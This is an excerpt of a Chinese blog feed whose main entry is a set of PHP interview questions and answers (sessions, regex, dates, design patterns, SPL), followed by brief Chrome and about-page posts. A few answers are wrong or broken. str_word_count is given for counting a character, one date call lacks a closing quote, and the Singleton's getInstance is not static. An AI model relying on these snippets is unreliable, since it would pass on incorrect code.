&lt;/ul&gt;

&lt;h4 id=&quot;请写出并说明如何在命令行下运行php脚本写出两种方式同时向php脚本传递参数&quot;&gt;请写出并说明如何在命令行下运行PHP脚本（写出两种方式）同时向PHP脚本传递参数？&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;getopt('f:sed::', array('option::'));
!php % -f'/home/' -f ~ --option=\a\b\c

$argv;
!php % '/home'

fgets(STDIN);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;写5个不同的自己函数来获取一个全路径文件的扩展名&quot;&gt;写5个不同的自己函数,来获取一个全路径文件的扩展名&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;function extension($filename) {
    $pathinfo = pathinfo($filename);
    return strtolower($pathinfo['extension']);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;语句include-和-require都能把另外一个文件包含到当前文件中它们的区别是为了避免多次包含同一文件可以用什么语句来代替它们&quot;&gt;语句include 和 require都能把另外一个文件包含到当前文件中，它们的区别是?为了避免多次包含同一文件，可以用什么语句来代替它们?&lt;/h4&gt;
&lt;p&gt;被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照 include_path 指定的目录寻找。如果在 include_path 下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。如果最后仍未找到文件则 include 结构会发出一条警告；这一点和 require 不同，后者会发出一个致命错误。&lt;/p&gt;

&lt;p&gt;如果定义了路径——不管是绝对路径（在 Windows 下以盘符或者 \ 开头，在 Unix/Linux 下以 / 开头）还是当前目录的相对路径（以 . 或者 .. 开头）——include_path 都会被完全忽略。例如一个文件以 ../ 开头，则解析器会在当前目录的父目录下寻找该文件。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;require 和 include 几乎完全一样，除了处理失败的方式不同之外。require 在出错时产生 E_COMPILE_ERROR 级别的错误。换句话说将导致脚本中止而 include 只产生警告（E_WARNING），脚本会继续运行。
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;简述如何得到当前执行脚本路径包括所得到参数&quot;&gt;简述如何得到当前执行脚本路径,包括所得到参数&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;__DIR__;
__FILE__;

getopt();
$argv;
$_REQUEST;
$_PUT = file_get_contents('php://input');
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;统计数组中所有值出现的次数对统计的结果按出现的次数排序&quot;&gt;统计数组中所有值出现的次数，对统计的结果，按出现的次数排序。&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$b = array_count_values($a);
arsort($b);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;上传文件的时候提示413-request-entity-too-large-的解决方法&quot;&gt;上传文件的时候提示413 Request Entity Too Large 的解决方法&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;#nginx.conf
client_max_body_size 10M
#php.ini
upload_max_filesize 所上传的文件的最大大小。
post_max_size       设定 POST 数据所允许的最大大小。
memory_limit        设定了一个脚本所能够申请到的最大内存字节数。
/*Sets max size of post data allowed. This setting also affects file upload. To upload large files, this value must be larger than upload_max_filesize. If memory limit is enabled by your configure script, memory_limit also affects file uploading. Generally speaking, memory_limit should be larger than post_max_size. */
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;用php打印出北京前一天的时间格式是2008-2-8-180010&quot;&gt;用PHP打印出北京前一天的时间格式是2008-2-8 18:00:10&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;date('Y-n-j H:i:s',strtotime('-1 days));
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;编写函数取得上一月的第一天和最后一天&quot;&gt;编写函数取得上一月的第一天和最后一天&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;date('Y-m-d', strtotime('last day of -1 months'));
date('Y-m-d', strtotime('first day of -1 months'));

strtotime('-1 days', strtotime(date('Y-m-01', time()))); //上一月的最后一天
mktime(0, 0, 0, date('m')-1, 1, date('Y')); //上一月的第一天
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;设有这样一个数组a--array-arrayid0-arrayid1-请问如何判断id500是否在这个数组内&quot;&gt;设有这样一个数组$a = array( array(id=&amp;gt;0), array(id=&amp;gt;1) ),请问如何判断id=&amp;gt;500是否在这个数组内?&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;in_array(array('id' =&amp;gt; 500), $a);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;计算字符串中某个字符的出现次数&quot;&gt;计算字符串中某个字符的出现次数&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;str_word_count($string);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;将字符012转换成十进制数字&quot;&gt;将字符012转换成十进制数字。&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;octdec('012');
(int)012;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;如何让php程序设置报错&quot;&gt;如何让PHP程序设置报错？&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;error_reporting(E_ALL);
ini_set('display_errors', 1);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;php的elseif-和else-if区别&quot;&gt;php的elseif 和else if区别?&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;elseif可以用于冒号，而else if则不能。
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;php正则表达式&quot;&gt;PHP正则表达式&lt;/h1&gt;
&lt;p&gt;preg是与Perl兼容正则表达式(Regular Expressions(Perl-Compatible));ereg以POSIX为基础(Regular Expression (POSIX Extended)),UNIX的可移植操作系统接口(As of PHP 5.3.0 this extension is deprecated, calling any function provided by this extension will issue an E_DEPRECATED notice).&lt;/p&gt;

&lt;h2 id=&quot;正则表达的元素&quot;&gt;正则表达的元素:&lt;/h2&gt;

&lt;h4 id=&quot;分隔符&quot;&gt;分隔符&lt;/h4&gt;

&lt;p&gt;模式需要由分隔符闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。
经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)&lt;/p&gt;

&lt;h4 id=&quot;原子&quot;&gt;原子&lt;/h4&gt;
&lt;h4 id=&quot;元字符&quot;&gt;元字符&lt;/h4&gt;
&lt;h4 id=&quot;转义序列&quot;&gt;转义序列&lt;/h4&gt;
&lt;h4 id=&quot;模式修正符&quot;&gt;模式修正符&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;http://www.php.net/manual/zh/book.pcre.php&quot;&gt;PCRE 函数 ¶&lt;/a&gt;
&lt;a href=&quot;http://book.douban.com/subject/2154713/&quot;&gt;&lt;em&gt;精通正则表达式 : 第3版&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;请用正则匹配href的属性&quot;&gt;请用正则匹配href的属性&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$link = '&amp;lt;a href=&quot;http://yanpeipan.github.io/&quot; title=&quot;PHP面试总结&quot;&amp;gt;PHP面试总结&amp;lt;/a&amp;gt;';
preg_match('/href=&quot;(.*)&quot;/U', $link, $match);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;请写一个函数验证电子邮箱的格式是否正确&quot;&gt;请写一个函数验证电子邮箱的格式是否正确&lt;/h4&gt;
&lt;p&gt;除了使用正则之外，还可以使用&lt;a href=&quot;http://cn2.php.net/manual/zh/book.filter.php&quot;&gt;Data Filtering ¶&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;preg_match('/^[\d\w-_]+@[\d\w-_]+(\.[\d\w-_]+)+$/', $email, $match);

filter_var($email, FILTER_VALIDATE_EMAIL);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;从字符串中提取日期时间格式y-m-dy-n-jymdynj&quot;&gt;从字符串中提取日期，时间格式：Y-m-d,Y-n-j,Ymd,Ynj&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;if (preg_match('/(?&amp;lt;!\d)(?:[\d]{4}+-?\d{1,2}-?\d{1,2})(?!\d)/', $title, $match)) {
        var_dump($match);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;引用&quot;&gt;引用&lt;/h1&gt;
&lt;p&gt;在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针，替代的是，引用是符号表别名。注意在 PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的 hardlink。
写复制(copy on write)
写改变(change on write)&lt;/p&gt;
&lt;h4 id=&quot;请说明php中传值与引用的区别和使用场景&quot;&gt;请说明PHP中传值与引用的区别和使用场景&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;应该避免使用引用，除非你非常清楚要做什么，如调用函数修改多个变量。
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;请解释以下代码每一步的运行a最后的结果为&quot;&gt;请解释以下代码每一步的运行,$a最后的结果为?&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$a = array('a', 'b', 'c');
  foreach($a as $key =&amp;gt; $value) {
    $val = &amp;amp;$a[$key];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;session--cookie&quot;&gt;Session &amp;amp; Cookie&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://cn2.php.net/manual/zh/intro.session.php&quot;&gt;Session 简介 ¶&lt;/a&gt;
session被用于表示一个持续的连接状态，在网站访问中一般指代客户端浏览器的进程从开启到结束的过程。session其实就是网站分析的访问（visits）度量，表示一个访问的过程。PHP session 变量用于存储有关用户会话的信息，或更改用户会话的设置。Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用。&lt;/p&gt;

&lt;p&gt;cookie 是一小段文本信息，伴随着用户请求和页面在Web服务器和浏览器之间传递。用户每次访问站点时，Web应用程序都可以读取cookie包含的信息。&lt;/p&gt;

&lt;p&gt;cookie的作用就是为了解决HTTP协议无状态的缺陷所作的努力，定义于：&lt;a href=&quot;http://www.ietf.org/rfc/rfc2965.txt&quot;&gt;IETF RFC 2965 HTTP State Management Mechanism&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;cookie分为二种:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;session的常见实现形式是会话cookie（session cookie），即未设置过期时间的cookie，这个cookie的默认生命周期为浏览器会话期间，只要关闭浏览器窗口，cookie就消失了。&lt;/li&gt;
  &lt;li&gt;持久cookie（persistent cookies）是指存放于客户端硬盘中的 cookie信息（设置了一定的有效期限），当用户访问某网站时，浏览器就会在本地硬盘上查找与该网站相关联的cookie。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;浏览器的cookie被禁止后session就需要用get方法的URL重写的机制或使用POST方法提交隐藏表单的形式来实现。&lt;/p&gt;
&lt;h4 id=&quot;session与cookie的区别&quot;&gt;session与cookie的区别?&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;1. 作用 : session被用于表示一个持续的连接状态;cookie被用于跟踪会话
2. 作用域 : Session 变量保存的信息是单一用户的，并且可供应用程序中的所有页面使用;cookie path/domain,同源策略
3. 数据 : session存放于服务端,cookie存放于客户端,并会被附加在每个HTTP请求中;在发送 cookie 时
4. 编码 ：cookie 的值会自动进行 URL 编码，在取回时进行自动解码
4. 生命周期 : session在session.gc_maxlifetime之后有几率被回收;持久cookie会在过期后立刻失效;临时cookie生命周期为浏览器会话期间
5. 安全性 : 客户端可以查看/修改cookie;cookie是通过HTTP协议明文传递的;session对用户是透明的;(cookie窃取与会话劫持)
6. 限制 : Cookie的大小限制在4KB左右
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;session的垃圾回收机制gc&quot;&gt;session的垃圾回收机制gc&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;http://www.laruence.com/2011/03/29/1949.html&quot;&gt;深入理解PHP原理之Session Gc的一个小概率Notice&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;在php中，session的回收机制主要依靠三个配置共同实现(在php.ini文件中)，分别是：
session.gc_maxlifetime = 1440 ;设置php session的有效期
session.gc_probability = 1 ;设置gc回收机制的被除数
session.gc_divisor     = 100  ;设置gc回收机制的除数
在PHP中, 如果使用file_handler作为Session的save handler，
那么就有概率在每次session_start的时候运行Session的Gc过程。
session gc被触发时,就会检查/tmp/sess_*的文件,
如果最后的修改时间到现在超过了1440秒(gc_maxlifetime的值),就将其删除,意味着这些session过期失效.
其调用概率相当于session.gc_probability/session.gc_divisor。
对于大型网站来说，频繁地回收会给服务器带来很大的开销,
一般会将session.gc_probability/session.gc_divisor设置的足够小。
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;如何设置一个严格30分钟过期的session&quot;&gt;如何设置一个严格30分钟过期的Session&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;http://www.laruence.com/2012/01/10/2469.html&quot;&gt;如何设置一个严格30分钟过期的Session&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;大型网站使用session时应该注意哪些问题&quot;&gt;大型网站使用Session时，应该注意哪些问题？&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;如何实现session跨域同步&quot;&gt;如何实现session跨域同步？&lt;/h4&gt;
&lt;h4 id=&quot;如何解决多站点session冲突&quot;&gt;如何解决多站点session冲突？&lt;/h4&gt;
&lt;h4 id=&quot;单点登陆如何实现&quot;&gt;单点登陆如何实现？&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;http&quot;&gt;HTTP&lt;/h1&gt;
&lt;h4 id=&quot;404页面&quot;&gt;404页面&lt;/h4&gt;
&lt;h4 id=&quot;重定向&quot;&gt;重定向&lt;/h4&gt;
&lt;h4 id=&quot;如何利用header实现直接下载保存而不是读取&quot;&gt;如何利用header实现直接下载保存而不是读取&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;header('Content-type: application/pdf');
header('Content-Disposition: attachment; filename=&quot;保存时的文件名.pdf&quot;');
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;用php写出显示客户端ip与服务端ip的代码&quot;&gt;用PHP写出显示客户端IP与服务端IP的代码&lt;/h4&gt;
&lt;h4 id=&quot;get与post提交方法的区别和限制&quot;&gt;get与post提交方法的区别和限制?&lt;/h4&gt;
&lt;h4 id=&quot;ajax跨域访问&quot;&gt;AJAX跨域访问&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;使用domain属性只能实现AJAX跨子域访问；
iframe需要双方服务器请求和被请求页面都要做轮询监听location对象的hash属性；
使用script标记则要求被访问数据格式为js可调用的变量或函数；
使用flash调用需要被请求服务器根目录有crossdomain.xml文件；
使用jsonp需要被请求服务器接受地址加回调函数参数和返回json数据；
Ajax请求本地的php，由php通过fopen完成跨域请求；
设置本域apache服务器的反向代理。
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;design-pattern&quot;&gt;Design pattern&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://book.douban.com/subject/3765462/&quot;&gt;&lt;em&gt;设计模式_Gang of Four](http://book.douban.com/subject/1052241/)
[_PHP高级程序设计&lt;/em&gt;&lt;/a&gt;
&lt;a href=&quot;http://book.douban.com/subject/4746407/&quot;&gt;&lt;em&gt;深入PHP：面向对象、模式与实践（第2版）&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;惰性加载&quot;&gt;惰性加载&lt;/h4&gt;
&lt;h4 id=&quot;观察者模式&quot;&gt;观察者模式&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;class Observable implements SplSubject
{
    private $storage;

    function __construct()
    {
        $this-&amp;gt;storage = new SplObjectStorage();
    }

    function attach(SplObserver $observer)
    {
        $this-&amp;gt;storage-&amp;gt;attach($observer);
    }

    function detach(SplObserver $observer)
    {
        $this-&amp;gt;storage-&amp;gt;detach($observer);
    }

    function notify()
    {
        foreach ($this-&amp;gt;storage as $obj) {
            $obj-&amp;gt;update($this);
        }
    }
    //...
}

abstract class Observer implements SplObserver
{
    private $observable;

    function __construct(Observable $observable)
    {
        $this-&amp;gt;observable = $observable;
        $observable-&amp;gt;attach($this);
    }

    function update(SplSubject $subject)
    {
        if ($subject === $this-&amp;gt;observable) {
            $this-&amp;gt;doUpdate($subject);
        }
    }

    abstract function doUpdate(Observable $observable);
}

class ConcreteObserver extends Observer
{
    function doUpdate(Observable $observable)
    {
        //...
    }
}

$observable = new Observable();
new ConcreteObserver($observable);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;单例模式&quot;&gt;单例模式&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;http://www.lfyzjck.com/php-sington-best-practice/&quot;&gt;PHP单例模式最佳实践&lt;/a&gt;
&lt;a href=&quot;http://php.net/manual/zh/language.oop5.late-static-bindings.php&quot;&gt;后期静态绑定 ¶&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Singleton
{
    protected static $_instance = null;
    protected function __construct()
    {

    }
    protected function __clone()
    {
        //disallow clone
        trigger_error('Clone is not allow !', E_USER_ERROR);
    }
    public function getInstance()
    {
        if (static::$_instance === null) {
            static::$_instance = new static;
        }
        return static::$_instance;
    }
}
class D extends Singleton
{
    protected static $_instance = null;
}
$c = Singleton::getInstance();
$d = D::getInstance();
var_dump($c === $d);
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;php-predefined-interfaces&quot;&gt;PHP Predefined Interfaces&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;http://www.nowamagic.net/librarys/veda/detail/2167&quot;&gt;PHP Predefined Interfaces 预定义接口&lt;/a&gt;
&lt;a href=&quot;http://www.php.net/manual/en/reserved.interfaces.php&quot;&gt;Predefined Interfaces and Classes ¶&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;traversable&quot;&gt;Traversable&lt;/h4&gt;
&lt;p&gt;This interface has no methods, its only purpose is to be the base interface for all traversable classes.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if( !is_array( $items ) &amp;amp;&amp;amp; !$items instanceof Traversable )
    //Throw exception here
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;iterator&quot;&gt;Iterator&lt;/h4&gt;
&lt;p&gt;Interface for external iterators or objects that can be iterated themselves internally.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Iterator extends Traversable
{
    //返回当前索引游标指向的元素
    abstract public mixed current(void)
    //返回当前索引游标指向的元素的键名
    abstract public scalar key(void)
    //移动当前索引游标指向下一元素
    abstract public void next(void)
    //重置索引游标的指向第一个元素
    abstract public void rewind(void)
    //判断当前索引游标指向的是否是一个元素，常常在调用 rewind()或 next()使用
    abstract public boolean valid(void)
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;iteratoraggregate&quot;&gt;IteratorAggregate&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;http://cn2.php.net/manual/en/class.iteratoraggregate.php&quot;&gt;The IteratorAggregate interface ¶&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class myData implements IteratorAggregate {
    public $property1 = &quot;Public property one&quot;;
    public $property2 = &quot;Public property two&quot;;
    public $property3 = &quot;Public property three&quot;;

    public function __construct() {
        $this-&amp;gt;property4 = &quot;last property&quot;;
    }

    public function getIterator() {
        return new ArrayIterator($this);
    }
}

$obj = new myData;

foreach($obj as $key =&amp;gt; $value) {
    var_dump($key, $value);
    echo &quot;\n&quot;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;arrayaccess&quot;&gt;ArrayAccess&lt;/h4&gt;
&lt;p&gt;Interface to provide accessing objects as arrays.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ArrayAccess {
/#### Methods ####/
abstract public boolean offsetExists ( mixed $offset )
abstract public mixed offsetGet ( mixed $offset )
abstract public void offsetSet ( mixed $offset , mixed $value )
abstract public void offsetUnset ( mixed $offset )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;serializable&quot;&gt;Serializable&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt; Serializable {
/#### Methods ####/
abstract public string serialize ( void )
abstract public void unserialize ( string $serialized )
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;closure&quot;&gt;Closure&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;class A {
    private static $sfoo = 1;
    private $ifoo = 2;
}
$cl1 = static function() {
    return A::$sfoo;
};
$cl2 = function() {
    return $this-&amp;gt;ifoo;
};

$bcl1 = Closure::bind($cl1, null, 'A');
$bcl2 = Closure::bind($cl2, new A(), 'A');
echo $bcl1(), &quot;\n&quot;;
echo $bcl2(), &quot;\n&quot;;
/################################################################################################################/
class A {
    function __construct($val) {
        $this-&amp;gt;val = $val;
    }
    function getClosure() {
        //returns closure bound to this object and scope
        return function() { return $this-&amp;gt;val; };
    }
}

$ob1 = new A(1);
$ob2 = new A(2);

$cl = $ob1-&amp;gt;getClosure();
echo $cl(), &quot;\n&quot;;
$cl = $cl-&amp;gt;bindTo($ob2);
echo $cl(), &quot;\n&quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;generator&quot;&gt;Generator&lt;/h4&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;spl&quot;&gt;SPL&lt;/h1&gt;
&lt;p&gt;SPL是Standard PHP Library（PHP标准库）的缩写。
根据官方定义，它是”a collection of interfaces and classes that are meant to solve standard problems”。但是，目前在使用中，SPL更多地被看作是一种使object（物体）模仿array（数组）行为的interfaces和classes。
&lt;a href=&quot;http://www.ruanyifeng.com/blog/2008/07/php_spl_notes.html&quot;&gt;PHP SPL笔记&lt;/a&gt;
&lt;a href=&quot;http://cn2.php.net/manual/zh/book.spl.php&quot;&gt;PHP标准库 (SPL) ¶&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;datastructures&quot;&gt;Datastructures&lt;/h4&gt;
&lt;h4 id=&quot;iterators&quot;&gt;Iterators&lt;/h4&gt;
&lt;h4 id=&quot;interfaces&quot;&gt;Interfaces&lt;/h4&gt;
&lt;h4 id=&quot;exceptions&quot;&gt;Exceptions&lt;/h4&gt;
&lt;h4 id=&quot;spl-functions&quot;&gt;SPL Functions&lt;/h4&gt;
&lt;h4 id=&quot;file-handling&quot;&gt;File Handling&lt;/h4&gt;
&lt;h4 id=&quot;miscellaneous-classes-and-interfaces&quot;&gt;Miscellaneous Classes and Interfaces&lt;/h4&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;网络编程&quot;&gt;网络编程&lt;/h1&gt;
&lt;h4 id=&quot;http响应码以及含义&quot;&gt;HTTP响应码以及含义&lt;/h4&gt;
&lt;h4 id=&quot;linux端口与服务&quot;&gt;Linux端口与服务&lt;/h4&gt;
&lt;h4 id=&quot;禁用cookie后session还能使用吗&quot;&gt;禁用Cookie后Session还能使用吗?&lt;/h4&gt;
&lt;h4 id=&quot;通过页面输入用户名abc和密码123登陆到www10086cn请写出该次请求的http协议报文包括请求行消息报头请求正文请并使用socket相关函数实现&quot;&gt;通过页面输入用户名abc和密码123登陆到www.10086.cn,请写出该次请求的HTTP协议报文(包括请求行,消息报头,请求正文),请并使用socket相关函数实现&lt;/h4&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;php高级&quot;&gt;PHP高级&lt;/h1&gt;
&lt;h4 id=&quot;ajax数据库触发器gui中断机制的共同思想谈一谈该种思想机制&quot;&gt;Ajax,数据库触发器，GUI，中断机制的共同思想。谈一谈该种思想（机制）。&lt;/h4&gt;
&lt;h4 id=&quot;把一篇英文文档中所有单词的首字母转为大写文档存在doctxt中可以在多种编程语言中选择ccjavaphp写出你的思路尽量优化你的程序&quot;&gt;把一篇英文文档中所有单词的首字母转为大写，文档存在doc.txt中。可以在多种编程语言中选择（C\C++,JAVA,PHP…)写出你的思路，尽量优化你的程序。&lt;/h4&gt;
&lt;h4 id=&quot;php的垃圾收集机制是怎样的&quot;&gt;PHP的垃圾收集机制是怎样的&lt;/h4&gt;
&lt;h4 id=&quot;写一个函数能够遍历一个文件夹下的所有文件和子文件夹&quot;&gt;写一个函数，能够遍历一个文件夹下的所有文件和子文件夹&lt;/h4&gt;
&lt;h4 id=&quot;写出一个能够创建多级目录的php函数&quot;&gt;写出一个能够创建多级目录的PHP函数&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;请写一段php代码确保多个进程同时写入同一个文件成功&quot;&gt;请写一段PHP代码，确保多个进程同时写入同一个文件成功&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;$fp = fopen(&quot;lock.txt&quot;, &quot;w+&quot;);//本地测试文件加下的txt文件，为了测试，可以为空或者写入一些东西
if (flock($fp, LOCK_EX)) { // 进行排它型锁定
    fwrite($fp, &quot;Write something here\n&quot;);
    flock($fp, LOCK_UN); // 释放锁定
    echo 123;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;有-一群猴子排成一圈按12n依次编号然后从第1只开始数数到第m只把它踢出圈从它后面再开始数--再数到第m只在把它踢出去如此不停的进行下去--直到最后只剩下一只猴子为止那只猴子就叫做大王要求编程模拟此过程输入mn-输出最后那个大王的编号&quot;&gt;有 一群猴子排成一圈，按1,2,…,n依次编号。然后从第1只开始数，数到第m只,把它踢出圈，从它后面再开始数，  再数到第m只，在把它踢出去…，如此不停的进行下去，  直到最后只剩下一只猴子为止，那只猴子就叫做大王。要求：编程模拟此过程，输入m、n, 输出最后那个大王的编号。&lt;/h4&gt;
&lt;h4 id=&quot;用php实现一个双向队列&quot;&gt;用PHP实现一个双向队列&lt;/h4&gt;
&lt;h4 id=&quot;使对象可以像数组一样进行foreach循环要求属性必须是私有&quot;&gt;使对象可以像数组一样进行foreach循环，要求属性必须是私有。&lt;/h4&gt;

&lt;h4 id=&quot;谈谈你对单点登录的理解比如原理与实现以及实现过程中有哪些问题需要注意&quot;&gt;谈谈你对单点登录的理解,比如原理与实现,以及实现过程中有哪些问题需要注意&lt;/h4&gt;
&lt;h4 id=&quot;对于大流量的网站您采用什么样的方法来解决访问量问题&quot;&gt;对于大流量的网站,您采用什么样的方法来解决访问量问题?&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;1 有效使用缓存，增加缓存命中率
2 使用负载均衡
3 对静态文件使用CDN进行存储和加速
4 想法减少数据库的使用
5 查看出现统计的瓶颈在哪里
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&quot;写出一种排序算法要写出代码并说出优化它的方法&quot;&gt;写出一种排序算法(要写出代码),并说出优化它的方法&lt;/h4&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/php/php-langspec/tree/master/spec&quot;&gt;php-langspec&lt;/a&gt;
&lt;a href=&quot;http://php.net/manual/zh/&quot;&gt;PHP官方手册&lt;/a&gt;
&lt;a href=&quot;https://github.com/PizzaLiu/PHP-FIG&quot;&gt;PHP编码规范 PHP-FIG PSR中文版&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Chrome</title>
   <link href="http://yanpeipan.github.io/chrome/2014/11/27/chrome.html"/>
   <updated>2014-11-27T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/chrome/2014/11/27/chrome</id>
   <content type="html">
&lt;hr /&gt;

&lt;h3 id=&quot;扩展&quot;&gt;扩展&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/adblock/gighmmpiobklfepjocnamgkkbiglidom&quot;&gt;AdBlock&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/postman-rest-client-packa/fhbjgbiflinjbdggehcddcbncdddomop&quot;&gt;Postman - REST Client (Packaged App)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb&quot;&gt;Vimium&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>关于</title>
   <link href="http://yanpeipan.github.io/2014/11/26/%E5%85%B3%E4%BA%8E.html"/>
   <updated>2014-11-26T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2014/11/26/关于</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;关于博客&quot;&gt;关于博客&lt;/h1&gt;
&lt;blockquote&gt;

  &lt;h2 id=&quot;目的&quot;&gt;目的&lt;/h2&gt;
  &lt;p&gt;读书笔记，以及经验总结&lt;/p&gt;

  &lt;h2 id=&quot;搭建&quot;&gt;搭建&lt;/h2&gt;
  &lt;p&gt;本博客基于&lt;code&gt;Jekyll&lt;/code&gt;，使用&lt;code&gt;JekyllBootstrap&lt;/code&gt;搭建, 主题选用&lt;code&gt;mark-reid&lt;/code&gt;.  发布于GitHub Pages， 访问域名：&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;http://yanpeipan.github.io/&quot;&gt;yanpeipan.github.io&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://yanpeipan.cn&quot;&gt;yanpeipan.cn&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;

